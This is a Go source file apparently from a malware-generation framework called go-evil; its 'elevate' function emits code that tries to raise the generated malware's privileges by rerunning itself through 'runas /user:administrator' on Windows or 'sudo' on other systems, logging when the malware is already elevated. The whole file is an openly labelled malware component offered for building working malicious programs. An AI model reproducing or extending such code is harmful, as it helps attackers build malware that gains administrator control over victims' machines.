package system

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
)

// Tries to do a so-called "regular" elevation of the malwares priviliges
func elevate(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "elevate"
	body := []string{fmt.Sprintf("func %s(){", function_call), "if spine.is_admin{", "spine.log(\"Malware is already elevated\")", "return", "}"}

	if data_object.Target_os == "windows" {
		body = append(body, "out, err := exec.Command(\"runas\", \"/user:administrator\", spine.path).Output()")

	} else {
		body = append(body, "out, err := exec.Command(\"sudo\", spine.path).Output()")
	}

	body = append(body, "if err != nil{", "spine.log(err.Error())", "return", "}", "spine.variable.set(string(out))")

	body = append(body, "}")

	data_object.Add_go_function(body)

	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
	data_object.Add_go_import("os")
	data_object.Add_go_import("os/exec")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)

}
